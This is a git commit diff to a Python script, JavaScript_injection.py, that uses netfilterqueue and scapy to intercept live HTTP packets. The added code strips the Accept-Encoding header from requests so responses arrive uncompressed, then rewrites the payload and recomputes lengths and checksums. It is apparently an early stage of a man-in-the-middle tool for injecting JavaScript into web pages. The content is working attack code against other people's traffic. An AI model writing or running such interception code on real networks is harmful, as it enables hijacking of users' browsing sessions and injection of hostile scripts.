b07edaed02385288c0dfd5750f0e5acf19954118
0x1tsjusthicham <hicham.ezzamzami@gmail.com>
2024-10-02 13:55:39 -0400

    Decrypt LOAD to readable html code

--- JavaScript_injection.py
+++ JavaScript_injection.py
@@ -1,13 +1,26 @@
 import netfilterqueue
 import scapy.all as scapy
+import re
 
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
 
+    return packet
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
         if scapy_packet[scapy.TCP].dport == 80:
             print("HTTP Request")
+            modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(bytes(new_packet))
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.TCP].chksum
             print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
             print("HTTP Request")
